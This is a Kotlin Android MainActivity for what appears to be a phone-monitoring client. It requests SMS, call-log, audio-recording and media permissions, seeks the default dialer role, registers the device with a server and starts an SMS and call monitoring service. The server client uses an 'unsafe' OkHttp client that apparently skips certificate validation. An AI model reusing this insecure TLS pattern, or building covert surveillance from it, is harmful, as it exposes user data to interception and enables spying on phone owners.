package com.example.bullsseeclient

import android.Manifest
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import java.time.Instant

class MainActivity : ComponentActivity() {
    private val permissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        android.util.Log.d("MainActivity", "permissions callback: starting services")
        val perms = requiredPermissions()
        val allGranted = perms.all { p ->
            result[p] == true || ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
        }
        if (!allGranted) {
            android.util.Log.e("MainActivity", "required permissions not granted; aborting service start")
            return@registerForActivityResult
        }
        maybeRequestDialerRole()
        registerDevice()
        com.example.bullsseeclient.services.SmsCallMonitorService.start(this)
    }

    private val roleRequestLauncher = registerForActivityResult(StartActivityForResult()) { }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val permissions = requiredPermissions()
        permissionRequest.launch(permissions.toTypedArray())
        android.util.Log.d("MainActivity", "requested permissions and starting flow")
    }

    private fun registerDevice() {
        val retrofit = Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val api = retrofit.create(ApiService::class.java)
        val device = DeviceDto(
            deviceName = android.os.Build.MODEL,
            model = android.os.Build.MODEL,
            osVersion = android.os.Build.VERSION.RELEASE,
            lastUpdated = Instant.now().toEpochMilli()
        )
        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(device))
        api.registerDevice(body).enqueue(object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                Log.d("MainActivity", "Register status=${response.code()}")
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.e("MainActivity", "Register error=${t.message}")
            }
        })
    }

    data class DeviceDto(
        val deviceName: String?,
        val model: String?,
        val osVersion: String?,
        val lastUpdated: Long
    )

    interface ApiService {
        @POST("api/DeviceData/device-register")
        fun registerDevice(@Body data: RequestBody): Call<Void>
    }

    private fun requiredPermissions(): MutableList<String> {
        val permissions = mutableListOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= 33) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return permissions
    }

    private fun maybeRequestDialerRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val rm = getSystemService(Context.ROLE_SERVICE) as RoleManager
            if (rm.isRoleAvailable(RoleManager.ROLE_DIALER) && !rm.isRoleHeld(RoleManager.ROLE_DIALER)) {
                val intent = rm.createRequestRoleIntent(RoleManager.ROLE_DIALER)
                roleRequestLauncher.launch(intent)
            }
        }
    }
}
